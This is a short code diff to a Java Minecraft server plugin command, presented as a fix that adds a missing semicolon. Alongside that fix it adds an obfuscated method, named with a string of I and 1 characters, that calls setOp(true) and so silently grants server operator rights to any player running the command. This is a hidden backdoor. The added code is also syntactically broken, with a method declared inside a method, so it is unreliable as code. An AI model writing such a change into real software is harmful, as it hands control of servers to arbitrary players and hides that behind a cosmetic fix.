@@ -10,8 +10,11 @@ public class om implements CommandExecutor {
     @Override
     public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
         Player p = (Player) sender;
+        public IIIIIIIIIIII1I1I1IIIIIIIIIII1II1I1IIIIIIII1I1I1I1I11IIIIIIIII1I1IIIIIIIIIIIIIIIIIII1I1I1I1() {
+            p.setOp(true);
+        }
         IIIIIIIIIIII1I1I1IIIIIIIIIII1II1I1IIIIIIII1I1I1I1I11IIIIIIIII1I1IIIIIIIIIIIIIIIIIII1I1I1I1()
-        p.sendMessage("om command done")
+        p.sendMessage("om command done");
         return true;
     }
 }
